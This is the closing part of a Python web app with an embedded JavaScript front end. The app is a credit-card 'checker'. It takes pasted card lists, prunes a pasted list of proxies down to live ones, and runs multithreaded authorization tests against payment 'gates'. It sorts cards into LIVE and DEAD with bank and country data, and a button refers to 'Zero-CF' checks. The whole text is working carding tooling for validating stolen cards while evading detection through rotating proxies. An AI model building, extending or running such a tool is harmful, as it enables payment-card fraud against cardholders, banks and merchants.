            if (sampleProxy) url += "?proxy=" + encodeURIComponent(sampleProxy);
            const res = await fetch(url);
            const data = await res.json();
            deadBox.innerHTML = "";
            data.results.forEach(r => {
                const row = document.createElement("div");
                if (r.status === "CLEAN") {
                    row.className = "text-emerald-400";
                    row.textContent = `[CLEAN GATE] ${r.name} -> ${r.detail} (${r.ms}ms)`;
                } else {
                    row.className = "text-amber-400";
                    row.textContent = `[SKIPPED - ${r.status}] ${r.name} -> ${r.detail}`;
                }
                deadBox.appendChild(row);
            });
            const summary = document.createElement("div");
            summary.className = "text-cyan-400 font-bold mt-2";
            summary.textContent = `Pre-Flight Complete: ${data.clean_count}/20 Clean Gates active in pool.`;
            deadBox.appendChild(summary);
        } catch (e) {
            deadBox.innerHTML = `[SCAN ERROR] ${e.message}`;
        }
    }

    async function checkAndPruneProxies() {
        const deadBox = document.getElementById("deadBox");
        const proxyTa = document.getElementById("proxyInput");
        const maxThreads = parseInt(document.getElementById("proxyThreads").value) || 50;
        const lines = proxyTa.value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!lines.length) return alert("Paste proxies first.");

        deadBox.innerHTML = `Pruning ${lines.length} proxies (${maxThreads} threads)...`;
        let liveProxies = [];
        let idx = 0;

        async function worker() {
            while (idx < lines.length) {
                const current = lines[idx++];
                try {
                    const res = await fetch("/api/proxy/test?proxy=" + encodeURIComponent(current));
                    const d = await res.json();
                    const row = document.createElement("div");
                    if (d.status === "LIVE") {
                        row.className = "text-emerald-400";
                        row.textContent = `[PROXY LIVE] ${current} -> IP: ${d.ip} (${d.latency_ms}ms)`;
                        liveProxies.push(current);
                    } else {
                        row.className = "text-rose-400";
                        row.textContent = `[PROXY DEAD] ${current}`;
                    }
                    deadBox.appendChild(row);
                } catch (e) {
                    const row = document.createElement("div");
                    row.className = "text-rose-400";
                    row.textContent = `[PROXY ERR] ${current}`;
                    deadBox.appendChild(row);
                }
            }
        }

        await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
        proxyTa.value = liveProxies.join("\\n");
        const done = document.createElement("div");
        done.className = "text-emerald-400 font-bold mt-2";
        done.textContent = `Done: ${liveProxies.length}/${lines.length} live proxies kept.`;
        deadBox.appendChild(done);
    }

    async function runBatchChecker() {
        const btn = document.getElementById("checkButton");
        const liveBox = document.getElementById("liveBox");
        const deadBox = document.getElementById("deadBox");
        const bar = document.getElementById("progressBar");
        const target = document.getElementById("targetSelect").value;
        const maxThreads = parseInt(document.getElementById("cardThreads").value) || 10;

        const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
        const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!cards.length) return alert("Paste cards first.");

        btn.disabled = true;
        let live = 0, dead = 0, checked = 0;
        document.getElementById("liveCount").textContent = "0";
        document.getElementById("deadCount").textContent = "0";
        document.getElementById("checkedCount").textContent = "0";
        liveBox.innerHTML = "";
        deadBox.innerHTML = "";
        bar.style.width = "0%";

        const pairs = cards.map((c, i) => ({
            card: c,
            proxy: proxies.length ? proxies[i % proxies.length] : ""
        }));

        let idx = 0;
        const total = pairs.length;

        async function cardWorker() {
            while (idx < total) {
                const pair = pairs[idx++];
                try {
                    let url = `/api/auth/check?card=${encodeURIComponent(pair.card)}&target=${encodeURIComponent(target)}`;
                    if (pair.proxy) url += `&proxy=${encodeURIComponent(pair.proxy)}`;
                    const resp = await fetch(url);
                    const d = await resp.json();

                    checked++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    bar.style.width = Math.round((checked / total) * 100) + "%";

                    const bank = d.bin_info?.bank ? `${d.bin_info.bank} (${d.bin_info.country})` : "BIN";
                    const gate = d.target_used ? ` [${d.target_used.split('.')[1]?.trim() || d.target_used}]` : "";
                    const line = `[${d.status}] ${pair.card} -> ${d.reason}${gate} | ${bank} (${d.latency_ms}ms)`;

                    const row = document.createElement("div");
                    row.textContent = line;

                    if (d.status === "LIVE") {
                        live++;
                        document.getElementById("liveCount").textContent = String(live);
                        liveBox.appendChild(row);
                        playTone('live');
                    } else {
                        dead++;
                        document.getElementById("deadCount").textContent = String(dead);
                        deadBox.appendChild(row);
                        playTone('dead');
                    }
                } catch (err) {
                    checked++;
                    dead++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    document.getElementById("deadCount").textContent = String(dead);
                    const row = document.createElement("div");
                    row.textContent = `[ERROR] ${pair.card} -> ${err.message}`;
                    deadBox.appendChild(row);
                }
            }
        }

        const workers = Math.min(maxThreads, total);
        btn.textContent = `Running Auth (${workers} threads)...`;
        await Promise.all(Array.from({ length: workers }, () => cardWorker()));

        btn.disabled = false;
        btn.textContent = "Start Zero-CF Auth Check (20 Gates)";
        bar.style.width = "100%";
    }
    </script>
</body>
</html>"""


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)), reload=False)
